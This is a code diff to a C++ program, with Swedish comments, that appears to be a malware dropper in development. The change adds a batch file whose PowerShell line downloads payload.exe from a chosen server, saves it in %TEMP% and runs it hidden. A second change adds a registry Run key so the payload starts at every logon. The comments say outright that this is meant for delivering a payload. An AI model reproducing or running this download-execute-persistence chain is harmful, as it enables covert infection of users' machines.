@@ -23,7 +23,12 @@ int main() {
         }
 
         landingFile << "@echo off\n";
-        landingFile << "echo Hej, detta är en skadlig fil!\n";
+        landingFile << "powershell -Command ^"
+                    << "Invoke-WebRequest -Uri 'http://localhost:8080/payload.exe' -OutFile '%TEMP%\\payload.exe'; "
+                    << "Start-Process '%TEMP%\\payload.exe' -WindowStyle Hidden"
+                    << "^";
+        //^ detta är hur vi skulle kunna skapa en .bat för att delivera en payload från en server som vi väljer.
+        //måste börja koda vår payload också!!
         landingFile.close();
 
         printf("Skapade filen: %s\\AppData\\Roaming\\maliciousevilfile.bat\n", userProfile);
@@ -42,10 +47,11 @@ int main() {
             return 1;
         }
 
-        string regCommand = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v MaliciousEvilFile /t REG_SZ /d \"" + string(userProfile) + "\\AppData\\Roaming\\maliciousevilfile.bat\" /f";
+        string regCommand = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v EvilExe /t REG_SZ /d \"%TEMP%\\payload.exe\" /f";
         system(regCommand.c_str());
 
         printf("Lade till registernyckel för att starta filen vid uppstart\n");
+        //osäker om detta sätt att lägga till regkey funkar
 
     }
     catch (const exception& e) {
